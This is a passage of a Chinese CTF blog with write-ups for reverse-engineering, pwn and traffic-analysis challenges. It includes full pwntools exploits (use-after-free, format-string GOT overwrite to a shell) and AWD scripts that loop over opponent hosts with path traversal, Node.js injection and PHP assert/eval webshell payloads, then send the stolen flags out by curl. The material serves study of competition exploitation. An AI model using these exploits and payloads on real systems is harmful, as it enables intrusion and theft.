(char)a1[10] + (char)a1[9] != (char)a1[11] ) return 0; if ( (char)a1[13] + (char)a1[12] != (char)a1[14] ) return 0; if ( (char)a1[16] + (char)a1[15] != (char)a1[17] ) return 0; if ( (char)a1[19] + (char)a1[18] == (char)a1[20] ) return (a1[8] ^ (unsigned __int8)(a1[11] ^ a1[14] ^ a1[17] ^ a1[21])) == a1[5]; return 0;&#125; 通过这个函数大概可以得到几个字符得到的方式，显然这里用 z3 是很难求解的。 getValue()12345678910int __cdecl getValue(char *a1)&#123; signed int i; // [esp+8h] [ebp-8h] int v3; // [esp+Ch] [ebp-4h] v3 = 0; for ( i = 6; i &lt;= 19; i += 3 ) v3 = 100 * v3 + 10 * (a1[i] - 48) + a1[i + 1] - 48; return v3;&#125; 从第六位开始，每次取三位，每三位取前两位组成数字 v3 并返回。 _func21234567int __cdecl trans2(char *a1, int i, int j)&#123; return abs(*(_DWORD *)&amp;a1[4 * j]) - abs(*(_DWORD *)&amp;a1[4 * j] + *(_DWORD *)&amp;a1[4 * i]) + abs(*(_DWORD *)&amp;a1[4 * i]) + 2;&#125; 简化为|x| + |y| - |x + y| + 2，根据 main 函数中的逻辑，该值应该为 0。但又因为|x| + |y| &gt;= |x + y|，故|x| + |y| - |x + y| + 2 &gt; 0，无法使之为 0。 下面开始对程序逆向分析： 由于第三个函数很难得到 0，可以想到溢出方面，使返回值为0x100000000。x 与 y 的值又因为互为相反数，可以求出|x|和|y|的值，而 y 在内存中的表示即为 x 的补码。得到 x 为 2147483647，y 为 2147483649。 通过 x 的值和 getValue 函数倒推出一部分 flag：flag{x21x47x48x36x47（x 为未知部分）。 根据 check 函数，写个脚本跑出大部分 flag：flag{x21c47k48l36i47k。 最后还有一部分由于不知道第 21 位 flag，猜测应该是}了，通过 check 函数异或后得到：flag{p21c47k48l36i47k} MISC-暴力可解8 位的数字暴力破解得到 zip 密码。 先试着用 stegsolve 把两张图合并无果，猜测是盲水印，用工具 BlindWaterMark，命令为python bwm.py 1.png 2.png flag.png，最后得到 flag。 PWN-Unote21234567root@b1571ee3e5b3:~/tmp# checksec ./Unote[*] '/root/tmp/Unote' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 32 位的堆题： 1234567891011121314151617181920212223242526272829303132333435363738394041424344void __cdecl __noreturn main()&#123; int v0; // eax char buf; // [esp+18h] [ebp-8h] unsigned int v2; // [esp+1Ch] [ebp-4h] v2 = __readgsdword(0x14u); setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); printf(\"Please input your username:\"); read(0, &amp;username, 0x1Eu); while ( 1 ) &#123; while ( 1 ) &#123; welcome(); read(0, &amp;buf, 4u); v0 = atoi(&amp;buf); if ( v0 != 2 ) break; delete(); &#125; if ( v0 &gt; 2 ) &#123; if ( v0 == 3 ) &#123; print(); &#125; else &#123; if ( v0 == 4 ) exit(0);LABEL_13: puts(\"Invalid choice\"); &#125; &#125; else &#123; if ( v0 != 1 ) goto LABEL_13; add(); &#125; &#125;&#125; 在delete这里看到free之后指针没有置空，可以 uaf： 12345678910111213141516171819202122unsigned int delete()&#123; int idx; // [esp+14h] [ebp-14h] char buf; // [esp+18h] [ebp-10h] unsigned int v3; // [esp+1Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(\"Index :\"); read(0, &amp;buf, 4u); idx = atoi(&amp;buf); if ( idx &lt; 0 || idx &gt;= size ) &#123; puts(\"Out of bound!\"); _exit(0); &#125; if ( !ptr[idx] ) return __readgsdword(0x14u) ^ v3; free(*((void **)ptr[idx] + 1)); // uaf free(ptr[idx]); puts(\"Success\"); return __readgsdword(0x14u) ^ v3;&#125; add把每个 chunk 的第一个部分置为puts函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546unsigned int add()&#123; _DWORD *v0; // ebx signed int i; // [esp+1Ch] [ebp-1Ch] int size; // [esp+20h] [ebp-18h] char buf; // [esp+24h] [ebp-14h] unsigned int v5; // [esp+2Ch] [ebp-Ch] v5 = __readgsdword(0x14u); if ( ::size &lt;= 2 ) &#123; for ( i = 0; i &lt;= 2; ++i ) &#123; if ( !ptr[i] ) &#123; ptr[i] = malloc(8u); if ( !ptr[i] ) &#123; puts(\"Alloca Error\"); exit(-1); &#125; *(_DWORD *)ptr[i] = puts_func; printf(\"Note size :\"); read(0, &amp;buf, 8u); size = atoi(&amp;buf); v0 = ptr[i]; v0[1] = malloc(size); if ( !*((_DWORD *)ptr[i] + 1) ) &#123; puts(\"Alloca Error\"); exit(-1); &#125; printf(\"Content :\"); read(0, *((void **)ptr[i] + 1), size); puts(\"Success !\"); ++::size; return __readgsdword(0x14u) ^ v5; &#125; &#125; &#125; else &#123; puts(\"Full\"); &#125; return __readgsdword(0x14u) ^ v5;&#125; print调用每个 chunk 的puts函数： 12345678910111213141516171819unsigned int print()&#123; int idx; // [esp+14h] [ebp-14h] char buf; // [esp+18h] [ebp-10h] unsigned int v3; // [esp+1Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(\"Index :\"); read(0, &amp;buf, 4u); idx = atoi(&amp;buf); if ( idx &lt; 0 || idx &gt;= size ) &#123; puts(\"Out of bound!\"); _exit(0); &#125; if ( ptr[idx] ) (*(void (__cdecl **)(void *))ptr[idx])(ptr[idx]); return __readgsdword(0x14u) ^ v3;&#125; 程序中还留了一个后门： 1234int __cdecl hack(int a1)&#123; return system(*(const char **)(a1 + 4));&#125; 可以在输入 username 的时候把/bin/sh传上去，然后利用 uaf 在第二次 malloc 的时候把后门函数和 buf 的地址传上去。 思路是 malloc 两次大一点的 chunk，然后先后 free 掉。再 malloc 一个大小为0x8的 chunk，会把之前两个存放puts函数的 chunk 取出来。free 两次之后四个 chunk 如下： 123456789101112131415161718192021222324252627282930313233343536assassinq&gt;&gt; p *(struct malloc_chunk *)0x8e80000$45 = &#123; prev_size = 0x0, size = 0x11, fd = 0x0, bk = 0x8e80018, fd_nextsize = 0x0, bk_nextsize = 0x29&#125;assassinq&gt;&gt; p *(struct malloc_chunk *)0x8e80010$46 = &#123; prev_size = 0x0, size = 0x29, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;assassinq&gt;&gt; p *(struct malloc_chunk *)0x8e80038$47 = &#123; prev_size = 0x0, size = 0x11, fd = 0x8e80000, bk = 0x8e80050, fd_nextsize = 0x0, bk_nextsize = 0x29&#125;assassinq&gt;&gt; p *(struct malloc_chunk *)0x8e80048$48 = &#123; prev_size = 0x0, size = 0x29, fd = 0x8e80010, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125; 然后可以把puts改成system后门，直接调用print就能 getshell。Exploit： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'context.arch = 'i386'context.terminal = ['tmux', 'sp', '-h']local = 1if local: p = process('./Unote')else: p = remote('101.71.29.5', 10001)elf = ELF('./Unote')puts_got = elf.got['puts']hack = 0x08048672gdb.attach(p)def cmd(c): p.recvuntil('choice :') p.send(str(c))def add(size, content): cmd(1) p.recvuntil('Note size :') p.send(str(size)) p.recvuntil('Content :') p.send(content)def delete(idx): cmd(2) p.recvuntil('Index :') p.send(str(idx))def show(idx): cmd(3) p.recvuntil('Index :') p.send(str(idx))p.recvuntil('Please input your username:')str_bin_sh = 0x0804A070p.send('/bin/sh\\x00')add(0x20, 'A') # 0add(0x20, 'B') # 1delete(0)delete(1)add(0x8, p32(hack) + p32(str_bin_sh))show(0)p.interactive() 流量分析相对系统地学习了一下 wireshark 的使用和流量分析。 前置知识 过滤 IP： ip.src eq x.x.x.x or ip.dst eq x.x.x.x ip.addr eq x.x.x.x 过滤端口： tcp.port eq 80 or udp.port eq 80 过滤 MAC eth.dst == A0:00:00:04:C5:84 http 模式过滤： http.request.method == &quot;GET&quot; http.request.method == &quot;POST&quot; http.request.uri == &quot;/img/logo-edu.gif&quot; http contains &quot;GET&quot; http contains &quot;HTTP/1.&quot; http.request.method == &quot;GET&quot; &amp;&amp; http contains &quot;User-Agent:&quot; webone.pcap协议分级发现大部分为 http，重点关注对话的 80 端口，基本可以确定黑客的地址。 黑客使用的扫描器 扫描器很容易发现： 或者可以用http contains查找常用的几种扫描器。 黑客扫描到的登陆后台 1http.request.method == &quot;POST&quot; 得知黑客使用了 awvs 后再次筛选可以找到登录后台： 黑客登陆 web 后台使用的账号密码 1http.request.method == &quot;POST&quot; and ip.src == 192.168.94.59 and http contains &quot;rec=login&quot; 黑客上传的 webshell 内容的 base 编码 1http.request.method == &quot;POST&quot; and ip.src == 192.168.94.59 and http contains &quot;eval&quot; 即将@eval($_POST[&#39;1234&#39;])base64 加密后提交。 黑客在 robots.txt 中找到的 flag 1http contains &quot;Disallow&quot; 黑客找到的数据库密码 1http contains &quot;web&quot; and http contains &quot;password&quot; 被黑客攻击的 web 服务器网卡内网 ip 1http contains &quot;eth&quot; webtwo.pcap 黑客在数据库中找到的 hash_code 1mysql contains &quot;hash_code&quot; 黑客破解账号 ijnu@test.com 得到的密码 1mysql contains &quot;ijnu@test.com&quot; 找到密码后 md5 解密： mailtwo.pcap &amp;&amp; mailtwo1.pcap 黑客登陆 mail 系统使用的账号 可以社工，直接用 web 的账号密码。 正经做法是先在 mailtwo.pcap 中找到加密算法： 12345678var key_hash = CryptoJS.MD5(\"1234567812345678\");var key = CryptoJS.enc.Utf8.parse(key_hash);var iv = CryptoJS.enc.Utf8.parse(\"1234567812345678\");form.password.value = CryptoJS.AES.encrypt(form.password.value, key, &#123; iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.ZeroPadding&#125;); 在 mailtwo1.pcap 中再过滤： 1(http contains &quot;&#123;\\&quot;success\\&quot;:true&#125;&quot; or http.request.method == &quot;POST&quot;) and ip.addr == 192.168.94.59 找到被加密的密码： 最后根据算法和已被加密的密码得到明文密码。 vpnone.pcap &amp;&amp; vpntwo.pcapvpnone.pcap 在尝试登陆 vpn，vpntwo.pcap 成功登陆了 vpn。 黑客获得的 vpn、ip 在统计-&gt;端点中流量最大的为黑客 ip。 参考网站： http://foreversong.cn/archives/216http://skysec.top/2018/08/25/2018%E5%AE%89%E6%81%928%E6%9C%88%E8%B5%9BWriteup/","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"}]},{"title":"2017-CSAW-Quals-realism","slug":"2017-CSAW-Quals-realism","date":"2018-08-30T14:09:36.000Z","updated":"2020-01-24T08:38:54.429Z","comments":true,"path":"2018/08/30/2017-CSAW-Quals-realism/","link":"","permalink":"qianfei11.coding.me/2018/08/30/2017-CSAW-Quals-realism/","excerpt":"学习 z3 时复现的一道题，了解了 SSE 指令以及学习了 gdb 和 qemu 之间的调试。","text":"学习 z3 时复现的一道题，了解了 SSE 指令以及学习了 gdb 和 qemu 之间的调试。 Analysis12$ file main.binmain.bin: DOS/MBR boot sector 题目给的是一个 DOS 程序，直接拖进 IDA，以 16 位的模式打开。定位到一处检测字符串前缀的代码，基本可以判断出 1234h 即我们输入的字符串在内存中的地址。 12345seg000:006F cmp dword ptr ds:1234h, &apos;galf&apos;seg000:0078 jnz loc_14Dseg000:007C movaps xmm0, xmmword ptr ds:1238hseg000:0081 movaps xmm5, xmmword ptr ds:7C00hseg000:0086 pshufd xmm0, xmm0, 1Eh 因为 IDA 不能反编译，所以基本上是直接看汇编，那么需要稍微了解一下 SSE 指令。 指令 作用 MOVAPS 把源存储器内容值送入目的寄存器。当有 m128 时, 内存地址必须是 16 字节对齐的。 PSHUFD 有三个操作数，从左往右，第一个操作数是目的操作数保存结果，第二个操作数是源操作数，第三个操作数是一个 8 位立即数，指定以怎样的顺序将源操作数中数据保存到目的操作数。 ANDPS 按位与 PSADBW 绝对差值求和 接下来的汇编部分有一些小复杂，动态调试会比较清晰。先用 qemu 启动程序（-s 参数开启远程调试服务）： 1qemu-system-i386 -drive format=raw,file=main.bin -s gdb 进行远程连接，并设置指令架构，同时在比较完 flag 前缀后设下断点（MBR 的加载地址是 0x7C00）： 1234gdb -ex 'target remote localhost:1234' \\ -ex 'set architecture i8086' \\ -ex 'break *0x7c6f' \\ -ex 'continue' 然后在程序中输入字符串，以 flag 为前缀，后面的部分用 a 到 p 来填充： 输入完成后我们可以看到 gdb 断了下来，此时可以开始和 IDA 对照着调试。可能是因为指令的结构不一样，所以 gdb 中只有当前指向的指令是基本正确的（有时可能也不正确，还是要看 IDA 的汇编）。同时在每次对 xmm 寄存器操作后，可以使用 p 命令输出并查看寄存器中的值。 首先单步调一下，看看两条 movaps 指令： 12seg000:007C movaps xmm0, xmmword ptr ds:1238hseg000:0081 movaps xmm5, xmmword ptr ds:7C00h 单步后可以看到 xmm0 中存放了我们输入的字符串中 flag 之后的部分（我是在 mac 下调试的，gdb 中可能有点 bug，寄存器存的值明显偏了 32 位）。接着执行下一条指令，可以看出 xmm5 中存放了内存中另一段的数据，可以打印出来看看： 1234567891011121314151617181920gef&gt; p $xmm5$6 = &#123; v4_float = &#123;-2.50091934, -1.48039995e-36, 1.93815862e-18, 0&#125;, v2_double = &#123;-1.787847107871084e-289, 2.8231360405480285e-315&#125;, v16_int8 = &#123;0x10, 0xf, 0x20, 0xc0, 0x83, 0xe0, 0xfb, 0x83, 0xc8, 0x2, 0xf, 0x22, 0x0, 0x0, 0x0, 0x0&#125;, v8_int16 = &#123;0xf10, 0xc020, 0xe083, 0x83fb, 0x2c8, 0x220f, 0x0, 0x0&#125;, v4_int32 = &#123;0xc0200f10, 0x83fbe083, 0x220f02c8, 0x0&#125;, v2_int64 = &#123;0x83fbe083c0200f10, 0x220f02c8&#125;, uint128 = 0x220f02c883fbe083c0200f10&#125;gef&gt; p $xmm4$7 = &#123; v4_float = &#123;0, 0, 0, -134298496&#125;, v2_double = &#123;0, -8.2671312985563202e+62&#125;, v16_int8 = &#123;0x0 &lt;repeats 12 times&gt;, 0xb8, 0x13, 0x0, 0xcd&#125;, v8_int16 = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x13b8, 0xcd00&#125;, v4_int32 = &#123;0x0, 0x0, 0x0, 0xcd0013b8&#125;, v2_int64 = &#123;0x0, 0xcd0013b800000000&#125;, uint128 = 0xcd0013b8000000000000000000000000&#125; 12seg000:0086 pshufd xmm0, xmm0, 1Ehseg000:008B mov si, 8 接下来单步执行 pshufd 这条指令。不关注 pshufd 的具体作用的话，可以在调试中看到，运行过后发现 xmm0 中的值从 0x706f6e6d6c6b6a696867666564636261 变成了 0x6463626168676665706f6e6d6c6b6a69，数据的顺序变化了。然后将 si 置为 8，在后面的调试中可以判断出，si 中存放的为循环次数。 12seg000:008E movaps xmm2, xmm0seg000:0091 andps xmm2, xmmword ptr [si+7D90h] 接下来两条指令分别将 xmm0 赋给 xmm2 以及将 xmm2 和内存中的一段数据按位与。看一看到 xmm2 中的值即为变化后的输入： 1234567891011121314151617181920gef&gt; p $xmm2$2 = &#123; v4_float = &#123;2.96401656e+29, 4.37102201e+24, 1.67779994e+22, 0&#125;, v2_double = &#123;8.5408834851248547e+194, 8.3212257841951935e-315&#125;, v16_int8 = &#123;0x6d, 0x6e, 0x6f, 0x70, 0x65, 0x66, 0x67, 0x68, 0x61, 0x62, 0x63, 0x64, 0x0, 0x0, 0x0, 0x0&#125;, v8_int16 = &#123;0x6e6d, 0x706f, 0x6665, 0x6867, 0x6261, 0x6463, 0x0, 0x0&#125;, v4_int32 = &#123;0x706f6e6d, 0x68676665, 0x64636261, 0x0&#125;, v2_int64 = &#123;0x68676665706f6e6d, 0x64636261&#125;, uint128 = 0x6463626168676665706f6e6d&#125;gef&gt; p $xmm1$3 = &#123; v4_float = &#123;0, 0, 0, 1.1384003e+27&#125;, v2_double = &#123;0, 1.8458895617341177e+214&#125;, v16_int8 = &#123;0x0 &lt;repeats 12 times&gt;, 0x69, 0x6a, 0x6b, 0x6c&#125;, v8_int16 = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6a69, 0x6c6b&#125;, v4_int32 = &#123;0x0, 0x0, 0x0, 0x6c6b6a69&#125;, v2_int64 = &#123;0x0, 0x6c6b6a6900000000&#125;, uint128 = 0x6c6b6a69000000000000000000000000&#125; 查看内存中的数据，可以看到和输入按位与之后，会把对应为 0x00 两个字节给抹掉。并通过下面的分析可以知道总共会有 8 次循环，每次进行按位与的数据是不同的，即每次的数据会左移 4 位： 12345678910111213141516gef&gt; x/2gx 0x7D980x7d98: 0xffffffffffffff00 0xffffffffffffff00gef&gt; x/2gx 0x7D970x7d97: 0xffffffffffff00ff 0xffffffffffff00ffgef&gt; x/2gx 0x7D960x7d96: 0xffffffffff00ffff 0xffffffffff00ffffgef&gt; x/2gx 0x7D950x7d95: 0xffffffff00ffffff 0xffffffff00ffffffgef&gt; x/2gx 0x7D940x7d94: 0xffffff00ffffffff 0xffffff00ffffffffgef&gt; x/2gx 0x7D930x7d93: 0xffff00ffffffffff 0xffff00ffffffffffgef&gt; x/2gx 0x7D920x7d92: 0xff00ffffffffffff 0xff00ffffffffffffgef&gt; x/2gx 0x7D910x7d91: 0x00ffffffffffffff 0x00ffffffffffffff 接着看 psadbw 这条指令，这里将 xmm5 和 xmm2 中的数据进行绝对差值求和（每 64 位的数据逐字节相减，将结果相加后存到前一个操作数中）。接着把高低 64 位经过绝对差值求和的结果（每个结果大小为 16 位，高低两个结果共 32 位）保存到 edi 中： 12345seg000:0096 psadbw xmm5, xmm2seg000:009A movaps xmmword ptr ds:1268h, xmm5seg000:009F mov di, ds:1268hseg000:00A3 shl edi, 10hseg000:00A7 mov di, ds:1270h 然后将 edi 中的结果和内存里的值比较，如果不相等，会有个大跳转，IDA 里大概判断一下应该是直接跳到失败处。 123456789seg000:00AB mov dx, siseg000:00AD dec dxseg000:00AE add dx, dxseg000:00B0 add dx, dxseg000:00B2 cmp edi, [edx+7DA8h]seg000:00BA jnz loc_14Dseg000:00BE dec siseg000:00BF test si, siseg000:00C1 jnz short sub_8E 查看内存中进行比较的值，正好 8 个值，每次都进行一次判断： 123gef&gt; x/8wx 0x7DA80x7da8: 0x02110270 0x02290255 0x025e0291 0x01f902330x7db8: 0x027b0278 0x02090221 0x0290025d 0x02df028f 基本上所有的线性关系都有了，接下来交给 z3 就行了。 Script12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env pythonfrom z3 import *def z3_abs(x): return If(x &gt;= 0, x, -x)def psadbw(xmm0, xmm1): a = Sum([z3_abs(b1 - b2) for b1, b2 in zip(xmm0[:8], xmm1[:8])]) b = Sum([z3_abs(b1 - b2) for b1, b2 in zip(xmm0[8:], xmm1[8:])]) return a + b * 0x10000s = Solver()ZERO = IntVal(0)xmm5 = '220f02c883fbe083c0200f10cd0013b8'.decode('hex')xmm5 = [ord(c) for c in xmm5]xmm5s = [xmm5]xmm0 = [Int('x%d' % i) for i in range(16)]for c in xmm0: s.add(c &gt;= 32, c &lt;= 126)check = [0x02df028f, 0x0290025d, 0x02090221, 0x027b0278, 0x01f90233, 0x025e0291, 0x02290255, 0x02110270]xmm5s += map(lambda e: [0, 0, 0, 0, 0, 0, (e &gt;&gt; 8) &amp; 0xFF, e &amp; 0xFF, 0, 0, 0, 0, 0, 0, e &gt;&gt; 24, (e &gt;&gt; 16) &amp; 0xFF], check)print xmm5sfor i in range(8): xmm5 = xmm5s[i] xmm2 = list(xmm0) xmm2[7 - i] = ZERO xmm2[15 - i] = ZERO res = psadbw(xmm5, xmm2) s.add(res == check[i])if s.check() == sat: print s.model() flag = ''.join(chr(eval(str(s.model()[c]))) for c in xmm0) # pshufd xmm0, xmm0, 1Eh flag = 'flag' + flag[:4][::-1] + flag[4:8][::-1] + flag[12:][::-1] + flag[8:12][::-1] print flag # flag&#123;4r3alz_m0d3_y0&#125; Referenceshttps://fortenf.org/e/ctfs/re/2017/09/18/csaw17-realism.html","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"},{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"}]},{"title":"2018-XMan结营赛","slug":"2018-XMan结营赛","date":"2018-08-22T09:39:54.000Z","updated":"2019-08-26T01:15:23.740Z","comments":true,"path":"2018/08/22/2018-XMan结营赛/","link":"","permalink":"qianfei11.coding.me/2018/08/22/2018-XMan结营赛/","excerpt":"记录一下被虐的经历。","text":"记录一下被虐的经历。 全队就我一个菜鸡维护二进制，全场被痛打，很难受。记录一下线下 AWD 所需要做的准备，以及两道 pwn 的复现。 准备第一次打 AWD，什么也不懂。 比赛前了解比赛赛制、环境。 服务器上线之后，第一时间改密码。 下载好FileZilla、Xshell等连接服务器的工具，把服务器上给的文件备份。 提前准备好自动化的脚本。 这里放一下队友 web 大佬的打全场脚本： 12345678910111213141516171819202122232425from requests import getfrom os import systemfor i in range(24): if i == 12: continue print(f\"======&#123;i+1&#125; starts=======\") url = f\"http://172.16.&#123;i+1&#125;.101:20001/uploads/images/../../../../../../../flag\" try: flag = get(url).text[:-1] system(f'curl http://172.16.200.20:9000/submit_flag/ -d \"flag=&#123;flag&#125;&amp;token=Hn4JuwQQ7Mfaek2HAuTkB3S6k4e38EKXQJEdtDDWDfsda2tqQUgUHRCtrtxbS9hMkQndVbVfHsD\"') print(f\"\\n&#123;flag&#125;\") except: print(f\"&#123;i+1&#125; : no\") pass url = f\"http://172.16.&#123;i+1&#125;.101:20001/category/test?0=%28function%28%29%7b%0a%20%20%20%20var%20fs%20%3d%20require%28%27fs%27%29%3b%0a%09var%20flag%20%3d%20fs.readFileSync%28%27%2fflag%27%2c%20%27utf-8%27%29%3b%0a%09fs.writeFileSync%28%27%2fhome%2fxctf%2fweb%2fstatic%2fjs%2ftest.js%27%2c%20flag%29%3b%0a%09return%201%3b%0a%7d%29%28%29%3b\" try: get(url) url = f\"http://172.16.&#123;i+1&#125;.101:20001/static/js/test.js\" flag = get(url).text flag = get(url).text[:-1] system(f'curl http://172.16.200.20:9000/submit_flag/ -d \"flag=&#123;flag&#125;&amp;token=Hn4JuwQQ7Mfaek2HAuTkB3S6k4e38EKXQJEdtDDWDfsda2tqQUgUHRCtrtxbS9hMkQndVbVfHsD\"') print(f\"\\n&#123;flag&#125;\") except: pass 1234567891011121314151617181920212223242526272829303132from requests import postfrom pyquery import PyQuery as pqfrom os import systemfor i in range(24): if i == 8: continue print(f\"======&#123;i+1&#125; starts=======\") if i == 12 or i == 2: continue payloads = [ \"@assert($_POST[cmd])\", \"@assert($_POST[cmd])\", \"@call_user_func(assert, $_POST[cmd])\", \"print(file_get_contents(chr(47).chr(102).chr(108).chr(97).chr(103)))\" ] for p in payloads: url = \"http://172.16.\" + str(i+1) + \".102:20002/?r=list&amp;pages=123&#123;$&#123;\" + p + \"&#125;&#125;123\" t = post(url, data=&#123;'cmd' : 'system(\"/bin/cat /flag\");'&#125;).text try: d = pq(t) out = d('.pagecode').html() print(out) flag = out.split(';')[-2].split('\\n')[1] if i==16: flag = flag[2:] print(f\"&#123;i+1&#125; : &#123;flag&#125;\") system(f'curl http://172.16.200.20:9000/submit_flag/ -d \"flag=&#123;flag&#125;&amp;token=Hn4JuwQQ7Mfaek2HAuTkB3S6k4e38EKXQJEdtDDWDfsda2tqQUgUHRCtrtxbS9hMkQndVbVfHsD\"') print('\\n') except: print(f\"&#123;i+1&#125; not avai\") pass 复现全场贡献只有成功 patch 了最容易的第二题。 once_timechecksec： 123456[*] '/home/assassinq/Desktop/once_time' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 拖进 ida，main 函数： 123456789101112131415unsigned __int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char s; // [rsp+0h] [rbp-20h] char v5; // [rsp+8h] [rbp-18h] unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); setbuf(); printf(\"input your name: \", a2); memset(&amp;s, 0, 9uLL); read(0, &amp;s, 9uLL); v5 = 0; printf(\"wellcome :%s\\n\", &amp;s); return vul();&#125; 另一个关键函数： 1234567891011121314151617unsigned __int64 vul()&#123; char s; // [rsp+0h] [rbp-20h] unsigned __int64 v2; // [rsp+18h] [rbp-8h] v2 = __readfsqword(0x28u); printf(\"leave a msg: \"); memset(&amp;s, 0, 0x10uLL); read(0, &amp;s, 0x20uLL); if ( strstr(&amp;s, \"%p\") || strstr(&amp;s, \"$p\") ) &#123; puts(\"do you want to leak info?\"); exit(0); &#125; printf(&amp;s, \"$p\"); return __readfsqword(0x28u) ^ v2;&#125; vul()中read(0, &amp;s, 0x20uLL);处存在buffer overflow，又因为开了 Canary，需要想办法绕过；printf(&amp;s, &quot;$p&quot;);处存在format string，可以实现任意地址的读和写。 首先将__stack_chk_fail的 got 表改成 main 函数的地址，那么这样每次栈溢出报错的时候就会再一次执行 main 函数，从而实现多次输入，可以多次利用printf(&amp;s，&quot;$p&quot;);进行格式化字符串攻击； 泄漏 libc 的基址，这里用泄漏 read 函数的真实地址来实现； 将 one_gadget 写入 exit()函数的 got 表中。 12345670008| 0x7fffffffdc10 (&quot;BBBBBBBB\\n&quot;) ; 第二次输入0016| 0x7fffffffdc18 --&gt; 0xa (&apos;\\n&apos;)0024| 0x7fffffffdc20 --&gt; 0x00032| 0x7fffffffdc28 --&gt; 0x8e2d258951a854000040| 0x7fffffffdc30 --&gt; 0x7fffffffdc60 --&gt; 0x400a20 (push r15)0048| 0x7fffffffdc38 --&gt; 0x400a08 (mov rcx,QWORD PTR [rbp-0x8])0056| 0x7fffffffdc40 (&quot;AAAAAAAA&quot;) ; 第一次输入 调试出来可以看到第一次输入位于第二次输入后的第六个参数，64 位下偏移就是 12。为了达到触发__stack_chk_fail的目的，我们还需要覆盖掉 Canary，位于第二次输入后的第三个参数处，故至少需要输入大于 24 个字符。read 总共读 0x20 个字符，我们这里也就读 0x20 个，以触发__stack_chk_fail。 第二步利用read的 got 表将 libc 基址泄漏出来。然后在已知 libc 版本的情况下，第三步将exit的 got 表覆盖成 one_gadget。最后送个%p或者$p上去 getshell。exp 如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#!/usr/bin/env python#coding=utf-8from pwn import *# context.log_level = 'debug'context.arch = 'amd64'p = process('./once_time')elf = ELF('./once_time')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')one_gadget_offset = 0xf1147info('&gt;&gt;&gt; REPLACE __stack_chk_fail WITH main &lt;&lt;&lt;')main = 0x400983stack_chk_fail_got = elf.got['__stack_chk_fail']p.recvuntil('input your name: ')p.sendline(p64(stack_chk_fail_got))p.recvuntil('leave a msg: ')payload = '%&#123;&#125;c%12$n'.format(str(main))payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)info('&gt;&gt;&gt; LEAK libc &lt;&lt;&lt;')read_got = elf.got['read']p.recvuntil('input your name: ')p.sendline(p64(read_got))p.recvuntil('leave a msg: ')payload = '%12$s'payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)data = p.recvuntil('\\x7f')print u64(data[-6:].ljust(8, '\\x00'))read_offset = libc.symbols['read']libc_base = u64(data[:6].ljust(8, '\\x00')) - read_offset# libc.address = read - read_offsetsuccess('libc_base = ' + hex(libc_base))one_gadget = libc_base + one_gadget_offsetsuccess('one_gadget = ' + hex(one_gadget))info('&gt;&gt;&gt; FMTSTR ATTACK &lt;&lt;&lt;')info('FIRST WORD')info(hex(one_gadget &amp; 0xFFFF))exit_got = elf.got['exit']p.recvuntil('input your name: ')p.sendline(p64(exit_got))p.recvuntil('leave a msg: ')payload = '%&#123;&#125;c%12$hn'.format(str(one_gadget &amp; 0xFFFF))#取最低的双字节并对齐payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)info('SECOND WORD')info(hex((one_gadget &gt;&gt; 16) &amp; 0xFFFF))p.recvuntil('input your name: ')p.sendline(p64(exit_got + 2))p.recvuntil('leave a msg: ')payload = '%&#123;&#125;c%12$hn'.format(str((one_gadget &gt;&gt; 16) &amp; 0xFFFF))payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)info('THIRD WORD')info(hex((one_gadget &gt;&gt; 32) &amp; 0xFFFF))p.recvuntil('input your name: ')p.sendline(p64(exit_got + 4))p.recvuntil('leave a msg: ')payload = '%&#123;&#125;c%12$hn'.format(str((one_gadget &gt;&gt; 32) &amp; 0xFFFF))payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)info('FOURTH WORD')info(hex((one_gadget &gt;&gt; 48) &amp; 0xFFFF))p.recvuntil('input your name: ')p.sendline(p64(exit_got + 6))p.recvuntil('leave a msg: ')if (one_gadget &gt;&gt; 48) &amp; 0xFFFF != 0: payload = '%&#123;&#125;c%12$hn'.format(str((one_gadget &gt;&gt; 48) &amp; 0xFFFF))else: payload = '%12$hn'payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)p.recvuntil('input your name: ')p.sendline('root')p.recvuntil('leave a msg: ')p.sendline('%p')p.recvuntil('\\n')success('&gt;&gt;&gt; PWNED BY ASSASSINQ &lt;&lt;&lt;')p.interactive() messageboard这题大佬们都用堆做，然而我一点都不会。后来神仙 pizza 给了一种format string的超简单做法。 123456[*] '/home/assassinq/Desktop/messageboard' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 拖进 ida 里，典型的堆题的形式，这里只看第四个选项： 123456789101112131415161718192021222324252627282930313233unsigned __int64 getshell()&#123; int fd; // ST04_4 __int64 v2; // [rsp+8h] 